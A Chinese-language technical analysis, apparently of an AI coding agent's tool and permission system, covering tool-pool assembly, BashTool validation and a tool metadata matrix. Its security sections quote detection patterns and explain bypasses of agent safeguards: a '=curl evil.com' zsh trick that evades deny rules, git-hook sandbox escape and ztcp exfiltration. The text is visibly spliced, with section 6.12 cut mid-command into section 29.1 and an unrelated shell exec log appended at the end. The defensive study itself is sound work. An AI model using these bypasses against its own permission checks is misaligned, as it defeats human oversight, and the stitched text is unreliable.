| **state 操作** | 20 | abortController / readFileState / getAppState / setAppState / setAppStateForTasks / setInProgressToolUseIDs / setResponseLength / pushApiMetricsEntry / updateFileHistoryState / updateAttributionState / appendSystemMessage / sendOSNotification / requestPrompt / handleElicitation |
| **subagent / fork** | 17 | nestedMemoryAttachmentTriggers / loadedNestedMemoryPaths / dynamicSkillDirTriggers / discoveredSkillNames / agentId / agentType / requireCanUseTool / messages / fileReadingLimits / globLimits / toolDecisions / queryTracking / criticalSystemReminder_EXPERIMENTAL / preserveToolUseResults / localDenialTracking / contentReplacementState / renderedSystemPrompt |

### 4.2 与 doc 51 的呼应

`ToolUseContext` 就是 doc 51 §7 `createSubagentContext` 的输入/输出。**子代理隔离 = ToolUseContext 的四维隔离**。

---

## 5. assembleToolPool：cache-stable 装配（tools.ts:289-330）

### 5.1 核心算法

```ts
export function assembleToolPool(permissionContext, mcpTools): Tools {
  const builtInTools = getTools(permissionContext)
  const allowedMcpTools = filterToolsByDenyRules(mcpTools, permissionContext)
  const byName = (a, b) => a.name.localeCompare(b.name)
  return uniqBy(
    [...builtInTools].sort(byName).concat(allowedMcpTools.sort(byName)),
    'name',
  )
}
```

### 5.2 cache-stable 关键设计

注释（tools.ts:308-316）：

> Sort each partition for prompt-cache stability, keeping built-ins as a contiguous prefix. The server's claude_code_system_cache_policy places a global cache breakpoint after the last prefix-matched built-in tool; a flat sort would interleave MCP tools into built-ins and invalidate all downstream cache keys whenever an MCP tool sorts between existing built-ins. uniqBy preserves insertion order, so built-ins win on name conflict.

**核心机制**：
1. **partition**：built-ins 先排序，MCP 后排序，**两个连续块**
2. **sort byName**：同块内字典序
3. **uniqBy name**：built-in 名字冲突时 built-in 赢
4. **server 端 cache policy**：在最后一个 prefix-matched built-in 后放置全局 cache breakpoint

**收益**：MCP 工具增删不影响 built-in 的 wire 字节 → prompt cache 命中。

### 5.3 4 种模式过滤

| 模式 | 工具集 |
|------|--------|
| 标准 | 全部 base tools + MCP |
| `--bare / CLAUDE_CODE_SIMPLE` | 仅 Bash + Read + Edit（或 REPL） |
| `REPL mode` | 隐藏原始 primitive（REPL 内部可用） |
| `coordinator mode` | `ASYNC_AGENT_ALLOWED_TOOLS` 白名单 |

---

## 6. BashTool：23 个安全 check（bashSecurity.ts + readOnlyValidation.ts + bashPermissions.ts + sedValidation.ts + pathValidation.ts）

BashTool 是 Clawcode 最复杂的工具——`BashTool.tsx` 1303 行 + `bashSecurity.ts` 2592 行 + `bashPermissions.ts` 2621 行 + `readOnlyValidation.ts` 1990 行 + `sedValidation.ts` 684 行 + `pathValidation.ts` 1303 行。

### 6.1 BashTool 元数据（BashTool.tsx:420-450）

```ts
export const BashTool = buildTool({
  name: 'Bash',
  searchHint: 'execute shell commands',
  maxResultSizeChars: 30_000,
  strict: true,
  
  isConcurrencySafe(input) {
    return this.isReadOnly?.(input) ?? false
  },
  isReadOnly(input) {
    const compoundCommandHasCd = commandHasAnyCd(input.command)
    return checkReadOnlyConstraints(input, compoundCommandHasCd).behavior === 'allow'
  },
  toAutoClassifierInput(input) { return input.command },
})
```

**核心特征**：isConcurrencySafe 委托给 isReadOnly——**只有只读命令才并发**，写命令强制串行（避免 race condition）。

### 6.2 BashTool inputSchema（BashTool.tsx:184-210）

```ts
const fullInputSchema = lazySchema(() => z.strictObject({
  command: z.string().describe('The command to execute'),
  timeout: semanticNumber(z.number().optional()).describe(`Optional timeout in milliseconds (max ${getMaxTimeoutMs()})`),
  description: z.string().optional().describe('...'),
  run_in_background: semanticBoolean(z.boolean().optional()).describe('...'),
  dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional()).describe('Set this to true to dangerously override sandbox mode and run commands without sandboxing.'),
  _simulatedSedEdit: z.object({ ... }).optional(),
}))
```

**4 个特殊字段**：
1. `run_in_background`：后台运行
2. `dangerouslyDisableSandbox`：覆盖 sandbox（带 "dangerously" 前缀警示）
3. `_simulatedSedEdit`：claude 把 sed -i 转成 Edit 工具调用，前缀 `_` 标记 internal
4. `timeout`：用 `semanticNumber` 处理模糊 token（"a minute" → 60000）

`z.strictObject` 严格模式——**禁止额外字段**，避免模型幻觉污染 schema。

### 6.3 userFacingName 渲染 sed 为 Edit

```ts
userFacingName(input) {
  if (!input) return 'Bash'
  if (input.command) {
    const sedInfo = parseSedEditCommand(input.command)
    if (sedInfo) {
      return fileEditUserFacingName({ file_path: sedInfo.filePath, old_string: 'x' })
    }
  }
  // Env var FIRST: shouldUseSandbox → splitCommand_DEPRECATED → shell-quote's
  // `new RegExp` per call. userFacingName runs per-render for every bash
  // message in history; with ~50 msgs + one slow-to-tokenize command, this
  // exceeds the shimmer tick → transition abort → infinite retry (#21605).
  return isEnvTruthy(process.env.CLAUDE_CODE_BASH_SANDBOX_SHOW_INDICATOR) && shouldUseSandbox(input) ? 'SandboxedBash' : 'Bash'
}
```

**关键优化**（注释）：`splitCommand_DEPRECATED` 内部用 `shell-quote` 的 `new RegExp`——每调用都新建 RegExp。`userFacingName` 每个 bash 消息每 render 都跑一次，50 个消息 + 1 个慢命令 = 超过 shimmer tick → transition abort → infinite retry（#21605）。**解决**：env var 优先 check（最快路径），仅在需要时走慢路径。

### 6.4 validateInput 4 个守卫

```ts
async validateInput(input) {
  // 1. MONITOR_TOOL feature 下检测阻塞 sleep 模式
  if (feature('MONITOR_TOOL') && !isBackgroundTasksDisabled && !input.run_in_background) {
    const sleepPattern = detectBlockedSleepPattern(input.command)
    if (sleepPattern !== null) {
      return {
        result: false,
        message: `Blocked: ${sleepPattern}. Run blocking commands in the background with run_in_background: true — you'll get a completion notification when done. For streaming events (watching logs, polling APIs), use the Monitor tool. If you genuinely need a delay (rate limiting, deliberate pacing), keep it under 2 seconds.`,
        errorCode: 10
      }
    }
  }
  return { result: true }
}
```

**反 sleep 阻塞**：禁止"故意 sleep 占用 turn"——超过 2 秒的 sleep 必须用 `run_in_background: true` 或 Monitor 工具。

### 6.5 BashTool.call 完整流程（BashTool.tsx:624-880）

```ts
async call(input, toolUseContext, _canUseTool, parentMessage, onProgress) {
  // 1. simulatedSedEdit → 直接应用 sed 而非运行
  if (input._simulatedSedEdit) return applySedEdit(input._simulatedSedEdit, toolUseContext, parentMessage)
  
  // 2. 提取 context 字段
  const { abortController, getAppState, setAppState, setToolJSX } = toolUseContext
  
  // 3. 初始化 accumulator + interpretation result
  const stdoutAccumulator = new EndTruncatingAccumulator()
  let interpretationResult
  let progressCounter = 0
  let wasInterrupted = false
  
  // 4. 判断是否阻止 cwd 变化（子代理）
  const isMainThread = !toolUseContext.agentId
  const preventCwdChanges = !isMainThread
  
  try {
    // 5. 异步生成器 runShellCommand
    const commandGenerator = runShellCommand({
      input, abortController,
      setAppState: toolUseContext.setAppStateForTasks ?? setAppState,  // 必须用 setAppStateForTasks
      setToolJSX, preventCwdChanges, isMainThread,
      toolUseId: toolUseContext.toolUseId,
      agentId: toolUseContext.agentId
    })
    
    // 6. 消费生成器，emit progress
    do {
      generatorResult = await commandGenerator.next()
      if (!generatorResult.done && onProgress) {
        const progress = generatorResult.value
        onProgress({
          toolUseID: `bash-progress-${progressCounter++}`,
          data: { type: 'bash_progress', output, fullOutput, elapsedTimeSeconds, totalLines, totalBytes, taskId, timeoutMs }
        })
      }
    } while (!generatorResult.done)
    
    result = generatorResult.value
    
    // 7. 解释命令结果（语义规则）
    interpretationResult = interpretCommandResult(input.command, result.code, result.stdout || '', '')
    
    // 8. 处理 interrupted
    const isInterrupt = result.interrupted && abortController.signal.reason === 'interrupt'
    
    // 9. 大输出持久化（MAX_PERSISTED_SIZE = 64MB）
    let persistedOutputPath, persistedOutputSize
    if (result.outputFilePath && result.outputTaskId) {
      const fileStat = await fsStat(result.outputFilePath)
      persistedOutputSize = fileStat.size
      await ensureToolResultsDir()
      const dest = getToolResultPath(result.outputTaskId, false)
      if (fileStat.size > MAX_PERSISTED_SIZE) await fsTruncate(...)
      try { await link(result.outputFilePath, dest) }
      catch { await copyFile(result.outputFilePath, dest) }
      persistedOutputPath = dest
    }
    
    // 10. log analytics
    logEvent('tengu_bash_tool_command_executed', { command_type, stdout_length, exit_code, interrupted })
    
    // 11. Claude Code hints protocol 提取 + 剥离
    const extracted = extractClaudeCodeHints(strippedStdout, input.command)
    
    // 12. 构造 tool_result（model-facing）
    return {
      data: { stdout: processedStdout, stderr, interrupted, isImage, backgroundTaskId, ..., persistedOutputPath, persistedOutputSize, structuredContent }
    }
  } finally {
    if (setToolJSX) setToolJSX(null)
  }
}
```

### 6.6 mapToolResultToToolResultBlockParam 的多模态适配

```ts
mapToolResultToToolResultBlockParam({ interrupted, stdout, stderr, isImage, backgroundTaskId, backgroundedByUser, assistantAutoBackgrounded, structuredContent, persistedOutputPath, persistedOutputSize }, toolUseID): ToolResultBlockParam {
  // 1. 结构化内容优先
  if (structuredContent && structuredContent.length > 0) {
    return { tool_use_id: toolUseID, type: 'tool_result', content: structuredContent }
  }
  
  // 2. 图像 → image content block
  if (isImage) {
    const block = buildImageToolResult(stdout, toolUseID)
    if (block) return block
  }
  
  // 3. 持久化输出 → <persisted-output> 包装
  if (persistedOutputPath) {
    const preview = generatePreview(processedStdout, PREVIEW_SIZE_BYTES)
    processedStdout = buildLargeToolResultMessage({ filepath: persistedOutputPath, originalSize, isJson: false, preview, hasMore })
  }
  
  // 4. 背景任务信息追加
  let backgroundInfo = ''
  if (backgroundTaskId) {
    const outputPath = getTaskOutputPath(backgroundTaskId)
    if (assistantAutoBackgrounded) {
      backgroundInfo = `Command exceeded the assistant-mode blocking budget (${ASSISTANT_BLOCKING_BUDGET_MS / 1000}s) and was moved to the background with ID: ${backgroundTaskId}. It is still running — you will be notified when it completes. Output is being written to: ${outputPath}. In assistant mode, delegate long-running work to a subagent or use run_in_background to keep this conversation responsive.`
    } else if (backgroundedByUser) {
      backgroundInfo = `Command was manually backgrounded by user with ID: ${backgroundTaskId}. Output is being written to: ${outputPath}`
    } else {
      backgroundInfo = `Command running in background with ID: ${backgroundTaskId}. Output is being written to: ${outputPath}`
    }
  }
  
  return {
    tool_use_id: toolUseID, type: 'tool_result',
    content: [processedStdout, errorMessage, backgroundInfo].filter(Boolean).join('\n'),
    is_error: interrupted
  }
}
```

**5 种 output mode**：structured / image / persisted（<persisted-output>）/ 普通 stdout / interrupted（加 `<error>` 标签）。

### 6.7 23 个 Bash Security Check ID

`bashSecurity.ts:83-99` 列出所有 check 的数字 ID：

```ts
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

**关键设计**：**用数字 ID 而不是字符串描述**——避免日志泄露具体 attack vector（攻击者通过 telemetry 反推防御细节）。

### 6.8 COMMAND_SUBSTITUTION_PATTERNS 11 种

`bashSecurity.ts:13-44` 列出 11 种 command substitution 攻击：

```ts
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  // Zsh EQUALS expansion: =cmd at word start expands to $(which cmd).
  // `=curl evil.com` → `/usr/bin/curl evil.com`, bypassing Bash(curl:*) deny
  // rules since the parser sees `=curl` as the base command, not `curl`.
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
  { pattern: /\}\s*always\s*\{/, message: 'Zsh always block (try/always construct)' },
  { pattern: /<#/, message: 'PowerShell comment syntax' },  // Defense in depth
]
```

**反 Zsh Equals Expansion 详解**：注释强调，`=curl evil.com` 在 parser 看到的是 `=curl`，但 shell 会展开成 `/usr/bin/curl evil.com`——**绕过 Bash(curl:*) deny rules**（parser 以为 base command 是 `=curl`，不是 `curl`）。

### 6.9 ZSH_DANGEROUS_COMMANDS 17 种

```ts
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',  // gateway to zsh/mapfile, zsh/system, zsh/zpty, zsh/net/tcp, zsh/files
  'emulate',    // emulate -c = eval-equivalent
  'sysopen', 'sysread', 'syswrite', 'sysseek',  // zsh/system FDs
  'zpty', 'ztcp', 'zsocket',  // 伪终端 / TCP / Unix socket
  'mapfile',   // invisible file I/O via array
  'zf_rm', 'zf_mv', 'zf_ln', 'zf_chmod', 'zf_chown', 'zf_mkdir', 'zf_rmdir', 'zf_chgrp',  // zsh/files builtin
])
```

**zmodload 是 gateway**：注释强调，`zmodload zsh/mapfile` 后 `mapfile` 可做隐形文件 I/O；`zmodload zsh/net/tcp` 后 `ztcp` 可做网络 exfiltration。**Block zmodload 即 block 大部分 zsh module attack**。

### 6.10 validateEmpty + validateIncompleteCommands

```ts
function validateEmpty(context): PermissionResult {
  if (!context.originalCommand.trim()) return { behavior: 'allow', updatedInput: { command: context.originalCommand }, decisionReason: { type: 'other', reason: 'Empty command is safe' } }
  return { behavior: 'passthrough', message: 'Command is not empty' }
}

function validateIncompleteCommands(context): PermissionResult {
  // 检测 4 种 incomplete 模式：
  // 1. starts with tab (line continuation)
  if (/^\s*\t/.test(originalCommand)) return { behavior: 'ask', message: 'incomplete fragment (starts with tab)' }
  // 2. starts with flag (likely continuation)
  if (trimmed.startsWith('-')) return { behavior: 'ask', message: 'incomplete fragment (starts with flags)' }
  // 3. starts with operator (&&, ||, ;, >, >>, <)
  if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) return { behavior: 'ask', message: 'continuation line' }
  return { behavior: 'passthrough' }
}
```

### 6.11 isSafeHeredoc 的 EARLY-ALLOW 模式

注释（bashSecurity.ts:317-321）：

> This is an EARLY-ALLOW path: returning `true` causes bashCommandIsSafe to return `passthrough`, bypassing ALL subsequent validators. Given this authority, the check must be PROVABLY safe, not probably safe.

**关键约束**：isSafeHeredoc 返回 true 会**绕过所有后续 validator**——必须 provably safe，不允许 probably safe。规则严格：delimiter 必须单引号或反斜杠转义；closing delimiter 必须独占一行；substitution 必须出现在参数位置（不能作为命令名）；剥除 heredoc 后剩余文本必须通过所有 validator。

实现用 LINE-BASED matching（不是 `[\s\S]*?`），精确复制 bash 的 heredoc-closing 行为。

### 6.12 checkReadOnlyConstraints 的 5 层防护（readOnlyValidation.ts:1876-1977）

```ts
export function checkReadOnlyConstraints(input, compoundCommandHasCd): PermissionResult {
  // 1. parse shell
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) return { behavior: 'passthrough', message: 'Command cannot be parsed' }
  
  // 2. 原命令先 check（splitCommand_DEPRECATED 会 transform）
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return { behavior: 'passthrough', message: 'Command is not read-only' }
  }
  
  // 3. Windows UNC path 防护
  if (containsVulnerableUncPath(command)) return { behavior: 'ask', message: 'UNC path WebDAV attack risk' }
  
  // 4. 检测 git subcommand（用于多 check）
  const hasGitCommand = commandHasAnyGit(command)
  
  // 5a. SECURITY: cd + git 复合 → sandbox escape（pre-commit hook 可执行）
  if (compoundCommandHasCd && hasGitCommand) return { behavior: 'passthrough', message: 'cd + git requires permission checks' }
  
  // 5b. SECURITY: 当前目录是 bare git repo（攻击者删除 .git/HEAD 后建 hooks）
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) return { behavior: 'passthrough', message: 'Bare git repo requires permission checks' }
  
  // 5c. SECURITY: 命令创建 git internal 文件（hooks/pre-commit）+ 运行 git
  // 攻击示例：mkdir -p hooks && echo ### 29.1 assembleToolPool 的 3 个调用方

| 调用方 | 用途 |
|--------|------|
| `useMergedTools` (REPL.tsx) | 主 thread 工具池 |
| `runAgent.ts` (AgentTool) | 子代理 worker 工具池 |
| `agentToolUtils.ts` (`filterToolsForAgent`) | 子代理过滤基础 |

**关键**：三处都走同一函数，**保证工具池一致**。

### 29.2 5 种工具池裁剪

| 维度 | 策略 |
|------|------|
| `filterToolsForAgent` | ALL_AGENT_DISALLOWED_TOOLS / CUSTOM_AGENT_DISALLOWED_TOOLS / ASYNC_AGENT_ALLOWED_TOOLS 三层 deny |
| `allowedAgentTypes` | `Agent(worker, researcher)` 限制子代理能力 |
| `applyCoordinatorToolFilter` | COORDINATOR_MODE_ALLOWED_TOOLS 白名单 |
| `filterToolsByDenyRules` | 用户 `Read(*/secret)` deny rule |
| `partition + sort byName` | cache-stable |

### 29.3 isMcpTool 判定

```ts
const [mcp, builtIn] = partition(uniqBy([...initialTools, ...assembled], 'name'), isMcpTool)
const tools = [...builtIn.sort(byName), ...mcp.sort(byName)]
```

**partition by isMcpTool**——MCP 工具集合在一起（后缀），built-ins 在前缀。

---

## 30. Tool 与 Permission 系统的接口

### 30.1 checkPermissions vs 通用 cascade

- **通用 cascade**（permissions.ts 14 步）：mode / rules / hooks / classifier / safetyCheck
- **Tool.checkPermissions**：工具特定权限

注释（Tool.ts:518-522）：

> Determines if the user is asked for permission. Only called after validateInput() passes. General permission logic is in permissions.ts. This method contains tool-specific logic.

### 30.2 checkPermissions 的执行链

```
1. validateInput(input, context) → pass?
2. checkPermissions(input, context) → behavior: 'allow' | 'deny' | 'ask' | 'passthrough'
3. (若 ask) → canUseTool 调用 + UI 弹窗
4. 通用 cascade 接管（rules / hooks / classifier / safetyCheck）
5. canUseTool 最终决策
```

### 30.3 preparePermissionMatcher 的优化

```ts
async preparePermissionMatcher({ file_path }) {
  return pattern => matchWildcardPattern(pattern, file_path)
}
```

注释（Tool.ts:529-534）：

> Prepare a matcher for hook if conditions. Called once per hook-input pair; any expensive parsing happens here. Returns a closure that is called per hook pattern.

**关键**：每对 (hook, input) 只调用一次，**昂贵解析在此完成**，返回的 closure 给 hook patterns 多次调用。

### 30.4 6 种 getPath/Pattern 来源

| 工具 | pattern 字段 |
|------|-------------|
| FileReadTool | file_path |
| FileEditTool | file_path |
| FileWriteTool | file_path |
| GrepTool | pattern |
| GlobTool | pattern |
| BashTool | argv（subcommand 分割） |

---

## 31. Tool 渲染层：12 个 render* 方法

### 31.1 渲染时机

| 阶段 | 渲染方法 |
|------|---------|
| 工具调用开始 | renderToolUseMessage(input, options) |
| 队列等待 | renderToolUseQueuedMessage?() |
| 进度推送 | renderToolUseProgressMessage?(progressMessages, options) |
| 结果返回 | renderToolResultMessage?(content, progress, options) |
| 用户拒绝 | renderToolUseRejectedMessage?(input, options) |
| 执行错误 | renderToolUseErrorMessage?(result, options) |
| 元数据标签 | renderToolUseTag?(input) |
| 并行折叠 | renderGroupedToolUse?(uses, options) |

### 31.2 UI 与 model-facing 双面性

```ts
// Model 看到的：完整内容 + 元数据
mapToolResultToToolResultBlockParam(content, toolUseID): ToolResultBlockParam

// UI 看到的：chrome only（"Read N lines"）
renderToolResultMessage?(content, progress, options): React.ReactNode
```

**transcript 搜索索引**（Tool.ts:614-621）：

> Chrome can be skipped (under-count is fine). Phantoms are not fine —— text that's claimed here but doesn't render is a count≠highlight bug.

`extractSearchText` 必须返回 UI 实际渲染的文本。FileReadTool / FileWriteTool 都返回空字符串（避免 phantom）。

### 31.3 renderFidelity 测试

`transcriptSearch.renderFidelity.test.tsx` 测试渲染 sample outputs——flag 出 indexed-but-not-rendered（phantom）或 rendered-but-not-indexed（under-count warning）。

### 31.4 getActivityDescription 的 spinner 文案

```ts
getActivityDescription(input) {
  const summary = getToolUseSummary(input)
  return summary ? `Reading ${summary}` : 'Reading file'
}
```

`getActivityDescription` 在 spinner 中显示——`Reading src/foo.ts` 让用户知道当前在做什么。

---

## 32. 工具元数据决策矩阵（17 工具完整对照）

| 工具 | isReadOnly | isDestructive | isConcurrencySafe | maxResultSizeChars | shouldDefer | requiresUserInteraction |
|------|-----------|---------------|-------------------|--------------------|-----------|---------------------|
| FileReadTool | true | n/a | true | Infinity | false | false |
| FileEditTool | false | false | false | 100_000 | false | false |
| FileWriteTool | false | isResultTruncated | false | 100_000 | false | false |
| NotebookEditTool | false | false | false | 100_000 | false | false |
| BashTool | per-input | per-input | per-input | 30_000 | false | false |
| GrepTool | true | n/a | true | 20_000 | false | false |
| GlobTool | true | n/a | true | 100_000 | false | false |
| WebFetchTool | true | n/a | true | 100_000 | true | false |
| WebSearchTool | true | n/a | true | 100_000 | false | false |
| LSPTool | true | n/a | true | 100_000 | true | false |
| EnterPlanModeTool | true | n/a | true | 100_000 | true | true (隐式) |
| ExitPlanModeV2Tool | false | n/a | true | 100_000 | true | per-context |
| EnterWorktreeTool | false | false | false | 100_000 | false | false |
| ExitWorktreeTool | true | n/a | false | 100_000 | false | false |
| SkillTool | false | n/a | false | 100_000 | per-context | false |
| AskUserQuestionTool | true | n/a | true | 100_000 | false (alwaysLoad) | **true** |
| TodoWriteTool | false | n/a | false | 100_000 | false | false |
| ConfigTool | per-input | n/a | false | 100_000 | false | false |
| TaskCreateTool | false | n/a | true | 100_000 | true | false |
| BriefTool | true | n/a | true | 100_000 | false | false |
| ToolSearchTool | true | n/a | true | 100_000 | alwaysLoad | false |
| SyntheticOutputTool | true | n/a | true | 100_000 | false | false |
| MCPTool | per-input | per-input | per-input | per-input | false | per-input |

**4 种典型决策模式**：

1. **只读工具**（Read/Grep/Glob/WebFetch/WebSearch/LSP/Brief/ToolSearch）→ isReadOnly=true + isConcurrencySafe=true → 并发派发 + 跳过权限
2. **写入工具**（FileEdit/Write/NotebookEdit）→ isReadOnly=false + isConcurrencySafe=false → 串行 + 权限弹窗
3. **复合工具**（Bash/MCP）→ per-input 动态判定
4. **alwaysLoad 工具**（AskUserQuestion）→ must show 必出现

---

## 33. 与 doc 49-52 的关联

### 33.1 与 doc 49（Subagent）

- `AgentTool` 本身是 Tool，**把 Tool 抽象递归用作 subagent 编排**——元能力
- `SendMessageTool` 通过 `agentNameRegistry` 反查 subagent ID
- `TaskCreate/TaskGet/TaskList/TaskUpdate/TaskOutput/TaskStop` 是 subagent 状态对象化接口
- `isConcurrencySafe` 决定 subagent 能否并发启动
- `TeamCreate/TeamDelete` 是 coordinator mode 对象化接口

### 33.2 与 doc 51（Context Engine）

- `assembleToolPool` 的 cache-stable partition-sort 是 doc 51 §6 实现
- `renderedSystemPrompt` 在 ToolUseContext 中是 fork 路径输入
- `contentReplacementState` 是内容替换状态
- `readFileState` 决定 Read Dedup（doc 53 §7.3）

### 33.3 与 doc 52（Session Memory）

- FileEditTool 的 `checkPermissions` 必须特殊处理 session memory 路径（仅允许 Edit）
- FileReadTool 的 `extractSearchText` 返回空 → transcript 不会命中 session memory
- `createMemoryFileCanUseTool` = FileEditTool 的精确白名单

### 33.4 与 doc 50（Auto Memory）

- `checkTeamMemSecrets` 在 FileEdit/Write 中拦截 secret 写入 team memory 文件
- `MAX_EDIT_FILE_SIZE = 1 GiB` 保护 large memory file
- team memory sync 与 isConcurrencySafe/isReadOnly 决策

---

## 34. 与 MUPS v4 节点映射

| MUPS v4 节点 | Clawcode Tools 体现 | 强度 |
|--------------|---------------------|------|
| Observe 事实捕获 | FileReadTool / GrepTool / GlobTool / LSPTool | ★★★★★ |
| Observe 信号监测 | BashProgress / WebSearchProgress / TaskOutputProgress | ★★★☆☆ |
| Observe 偏差识别 | toAutoClassifierInput + 14 步 PermissionDecision | ★★★★☆ |
| Observe 意图解析 | （由父 LLM 决策；工具本身不解析） | — |
| Plan 承诺型 | isReadOnly / isDestructive 自我声明 | ★★★★☆ |
| Plan 协议型 | checkPermissions + preparePermissionMatcher + hooks | ★★★★★ |
| Plan 场景型 | 42 工具分 6 类别（按业务域） | ★★★★☆ |
| Plan 探索型 | ToolSearchTool + shouldDefer（6 个工具） | ★★★★☆ |
| Execute 确定型 | async call(input, context, canUseTool, parentMessage, onProgress) | ★★★★★ |
| Execute 响应型 | onProgress 回调 + renderToolUseProgressMessage | ★★★★☆ |
| Execute 诊断型 | （不在 tools 层；由 verification agent 承担） | — |
| Execute 实验型 | isolation: worktree + BashTool simulatedSedEdit | ★★★☆☆ |
| Verify 合规性 | validateInput → checkPermissions → 14 步 cascade | ★★★★★ |
| Verify 时效性 | maxResultSizeChars + ContentReplacementState | ★★★★★ |
| Verify 归因性 | （缺失：无 Indeterminate） | ☆☆☆☆☆ |
| Verify 统计性 | （缺失：无置信度评分） | ☆☆☆☆☆ |
| Learn 固化型 | （不在 tools 层；由 SessionMemory / AutoMemory 承担） | — |
| Learn 调优型 | （缺失） | ☆☆☆☆☆ |
| Learn 扩充型 | （缺失） | ☆☆☆☆☆ |
| Learn 知识化 | （缺失） | ☆☆☆☆☆ |

**与 doc 40 §10.5 修正评分的关系**：

| 节点 | doc 40 | doc 53 v2 补充 | 修正 |
|------|--------|----------------|------|
| Observe | 35% | 偏差识别 + 信号监测 | 40% |
| Plan | 50% | 协议型（hooks + matcher） + 探索型（ToolSearch） | 56% |
| Execute | 60% | 23 个 Bash check + simulatedSedEdit + isolation | 65% |
| Verify | 28% | validateInput + checkPermissions + 14 cascade | 35% |
| Learn | 35% | （无新增） | 35% |
| **整体** | **~32%** | | **~37%** |

**核心修正**：Verify 28% → 35%（最大提升）；Plan 50% → 56%；Execute 60% → 65%。

---

## 35. 关键决策点速查表

| 决策点 | 默认 | 改写入口 | 触发条件 |
|--------|------|----------|---------|
| isConcurrencySafe | false（串行） | override | 并发派发需求 |
| isReadOnly | false（写入） | override | permission + persistence |
| isDestructive | false | override | 破坏性警告 |
| interruptBehavior | block | override | 用户发新消息时 |
| maxResultSizeChars | 30_000 | override | 持久化阈值 |
| strict | false | override | API strict mode |
| searchHint | 无 | override | ToolSearch 关键词 |
| shouldDefer | false | override | 动态加载 |
| alwaysLoad | false | override | 必出现在初始 schema |
| checkPermissions | allow | override | 工具特定权限 |
| toAutoClassifierInput | '' (跳过) | override | auto-mode 分类器 |
| extractSearchText | heuristic | override | transcript 搜索 |
| backfillObservableInput | identity | override | 规范化输入 |
| requiresUserInteraction | false | override | UI 交互 |
| isTransparentWrapper | false | override | REPL wrapper |
| Schema 加载时机 | 模块加载 | lazySchema(() => ...) | 按需求值 |
| 工具装配顺序 | built-ins prefix + MCP suffix | assembleToolPool | cache-stable |
| name 冲突 | built-in 赢 | uniqBy insertion order | — |
| 特征 gate | env / feature() | tools.ts 条件 require | ant-only / KAIROS |
| BashTool 并发 | 仅 readOnly | isReadOnly | 命令语义 |
| BashTool timeout | 默认 max | getMaxTimeoutMs() | env override |
| BashTool sandbox | 默认开 | shouldUseSandbox | dangerouslyDisableSandbox |
| Read Dedup | GB flag 控制 | tengu_read_dedup_killswitch | 18% 节省 |
| Read maxResultSize | Infinity | hardcoded | 防循环 |
| Edit maxResultSize | 1 GiB | MAX_EDIT_FILE_SIZE | OOM 防护 |
| UNC path 跳过 | 默认 true | hardcoded | NTLM 凭据泄露 |
| 文件路径展开 | 强制 absolute | backfillObservableInput | hook 绕过 |
| secret 检测 | 默认开 | checkTeamMemSecrets | team memory 文件 |

---

## 36. 一句话总结（再压缩）

Clawcode Tools 是一套**以 Tool 接口 + buildTool 工厂 + assembleToolPool cache-stable 装配 + 42 工具逐个精读**为核心的工程化框架。本文档逐个精读了：

- **6 类别 42 工具**：文件 4 / Shell 2 / 检索 3 / Web 2 / 编排 10 / Plan+Worktree 5 / MCP 4 / 辅助 16
- **35 接口字段 + 7 fail-closed 默认值**
- **BashTool 13000 行**：23 个 security check（防 sandbox escape / compound bypass / zsh 特有攻击）+ 5 层 git escape 防护 + simulated sed 自动转 Edit + MAX_SUBCOMMANDS_FOR_SECURITY_CHECK=50 防 event loop 饿死
- **FileReadTool 1183 行**：Read Dedup 节省 ~18% cache_creation + BLOCKED_DEVICE_PATHS 12 路径 + 6 种文件类型适配
- **FileEditTool/WriteTool**：1 GiB OOM 防护 + UNC path 跳过 + secret 检测 + z.strictObject 严格模式
- **17 工具元数据决策矩阵**：从 Read/Grep 等纯只读到 Bash/MCP per-input 动态判定的完整对照

**与 doc 49-52 的交叉点是 ToolUseContext**（35 字段上下文同时承载子代理隔离 + 上下文引擎注入 + 会话记忆权限）。整体把 MUPS v4 评分从 32% 拉到 37%——Verify 28% → 35%（最大提升，validateInput + checkPermissions + 14 cascade 是工程化 Verify 的具体落地）。

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/bootstrap/turn_adapter.go 2>/dev/null | head -60' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
package bootstrap

import (
	"context"
	"encoding/json"
	"fmt"

	"golang.org/x/sync/errgroup"

	"github.com/devrix/devrix/internal/layers/communication/capture"
	"github.com/devrix/devrix/internal/layers/contextengine"
	"github.com/devrix/devrix/internal/layers/contextengine/kernel"
